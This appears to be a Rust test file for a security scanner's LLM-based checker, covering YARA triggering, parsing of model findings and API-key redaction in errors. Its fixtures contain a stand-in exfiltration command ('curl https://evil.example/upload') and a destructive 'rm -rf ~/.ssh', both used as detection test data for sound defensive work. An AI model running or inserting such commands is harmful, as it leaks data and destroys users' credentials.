use std::fs;

use sentra_lib::interfaces::{CheckInput, FileCategory, FileExtType, RiskCategory, RiskSeverity};
use sentra_lib::risks::checkers::RiskChecker;
use sentra_lib::risks::types::CheckerConfig;
use sentra_lib::risks::{LlmConfig, RuleDirectoryConfig, ScanOptions};

const YARA_RULE: &str = r#"
rule TriggerLlmReview {
    strings:
        $marker = "curl https://evil.example/upload"
    condition:
        $marker
}
"#;

fn checker_with_llm(llm: LlmConfig) -> (tempfile::TempDir, RiskChecker) {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("trigger.yar"), YARA_RULE).unwrap();
    let checker = RiskChecker::new(ScanOptions {
        checker: Some(CheckerConfig {
            enable_hash: Some(false),
            enable_yara: Some(true),
            enable_llm: Some(true),
            enable_local_ti: Some(false),
            enable_online_ti: Some(false),
        }),
        rules: Some(RuleDirectoryConfig {
            yara: Some(dir.path().to_path_buf()),
            ..RuleDirectoryConfig::default()
        }),
        llm: Some(llm),
        ..ScanOptions::default()
    })
    .unwrap();
    (dir, checker)
}

#[test]
fn llm_checker_with_incomplete_options_is_error() {
    let (_dir, checker) = checker_with_llm(LlmConfig {
        api_url: Some("https://example.test".to_string()),
        api_key: None,
        model: Some("model".to_string()),
        ..LlmConfig::default()
    });
    let input = CheckInput::content("skill.md", "curl https://evil.example/upload")
        .with_file_meta(FileCategory::Prompt, FileExtType::Md);

    let output = block_on(checker.scan(&[input])).unwrap();

    assert_eq!(output.errors.len(), 1);
    assert_eq!(output.errors[0].reason, "missing apiUrl / apiKey / model");
}

#[test]
fn llm_checker_maps_offline_raw_findings_from_options_response() {
    let (_dir, checker) = checker_with_llm(LlmConfig {
        api_url: Some("offline://fixture".to_string()),
        api_key: Some("test-key".to_string()),
        model: Some("test-model".to_string()),
        prompt: Some(
            r#"
            <think>private reasoning</think>
            noise before
            ```json
            {
              "results": [
                {
                  "file": "other.md",
                  "findings": [
                    {"severity":"CRITICAL","category":"DATA_EXFILTRATION","title":"skip me"}
                  ]
                },
                {
                  "file": "skill.md",
                  "findings": [
                    {
                      "severity": "NOT_A_SEVERITY",
                      "category": "NOT_A_CATEGORY",
                      "title": "Runtime instruction",
                      "title_zh": "运行时指令",
                      "description": "Dangerous instruction",
                      "description_zh": "危险指令",
                      "evidence": "curl https://evil.example/upload",
                      "remediation": "Remove the instruction",
                      "remediation_zh": "删除该指令"
                    },
                    {
                      "severity": "HIGH",
                      "category": "MALICIOUS_EXECUTION",
                      "title": "Fallback line",
                      "description": "First line evidence",
                      "evidence": "missing line\nrm -rf ~/.ssh",
                      "remediation": "Remove destructive command"
                    }
                  ]
                }
              ]
            }
            ```
            noise after
            "#
            .to_string(),
        ),
        ..LlmConfig::default()
    });
    let input = CheckInput::content(
        "skill.md",
        "safe\ncurl https://evil.example/upload\nx\nrm -rf ~/.ssh\n",
    )
    .with_file_meta(FileCategory::Prompt, FileExtType::Md);

    let output = block_on(checker.scan(&[input])).unwrap();
    let llm_findings = output
        .findings
        .iter()
        .filter(|finding| finding.checker == "llm-checker")
        .collect::<Vec<_>>();

    assert_eq!(llm_findings.len(), 2);

    let first = llm_findings[0];
    assert_eq!(first.severity, RiskSeverity::Info);
    assert_eq!(first.category, RiskCategory::Misconfiguration);
    assert_eq!(first.file, "skill.md");
    assert_eq!(first.location.line, 2);
    assert_eq!(first.title_zh.as_deref(), Some("运行时指令"));
    assert_eq!(first.description_zh.as_deref(), Some("危险指令"));
    assert_eq!(first.remediation_zh.as_deref(), Some("删除该指令"));
    assert_eq!(first.severity_zh.as_deref(), Some("信息"));
    assert_eq!(first.category_zh.as_deref(), Some("配置错误"));

    let second = llm_findings[1];
    assert_eq!(second.severity, RiskSeverity::High);
    assert_eq!(second.category, RiskCategory::MaliciousExecution);
    assert_eq!(second.location.line, 4);
    assert_eq!(second.title_zh.as_deref(), Some("Fallback line"));
    assert_eq!(
        second.description_zh.as_deref(),
        Some("First line evidence")
    );
    assert_eq!(
        second.remediation_zh.as_deref(),
        Some("Remove destructive command")
    );
}

#[test]
fn llm_parse_errors_include_request_context_without_api_key() {
    let (_dir, checker) = checker_with_llm(LlmConfig {
        api_url: Some("offline://fixture".to_string()),
        api_key: Some("test-secret-key".to_string()),
        model: Some("test-model".to_string()),
        prompt: Some("not json".to_string()),
        ..LlmConfig::default()
    });
    let input = CheckInput::content("skill.md", "curl https://evil.example/upload")
        .with_file_meta(FileCategory::Prompt, FileExtType::Md);

    let output = block_on(checker.scan(&[input])).unwrap();
    let reason = &output.errors[0].reason;

    assert!(reason.contains("failed to parse model response as JSON"));
    assert!(reason.contains("source: skill.md"));
    assert!(reason.contains("model: test-model"));
    assert!(reason.contains("protocol: anthropic_messages"));
    assert!(reason.contains("stream: false"));
    assert!(reason.contains("raw_chars: 8"));
    assert!(reason.contains("extracted_chars: 8"));
    assert!(reason.contains("response excerpt: not json"));
    assert!(reason.contains("serde error:"));
    assert!(!reason.contains("test-secret-key"));
}

#[test]
fn llm_empty_parse_errors_include_request_context() {
    let (_dir, checker) = checker_with_llm(LlmConfig {
        api_url: Some("offline://fixture".to_string()),
        api_key: Some("test-secret-key".to_string()),
        model: Some("test-model".to_string()),
        prompt: Some(String::new()),
        ..LlmConfig::default()
    });
    let input = CheckInput::content("skill.md", "curl https://evil.example/upload")
        .with_file_meta(FileCategory::Prompt, FileExtType::Md);

    let output = block_on(checker.scan(&[input])).unwrap();
    let reason = &output.errors[0].reason;

    assert!(reason.contains("source: skill.md"));
    assert!(reason.contains("model: test-model"));
    assert!(reason.contains("raw_chars: 0"));
    assert!(reason.contains("extracted_chars: 0"));
    assert!(reason.contains("response excerpt: <empty>"));
    assert!(!reason.contains("test-secret-key"));
}

fn block_on<T>(future: impl std::future::Future<Output = T>) -> T {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap()
        .block_on(future)
}
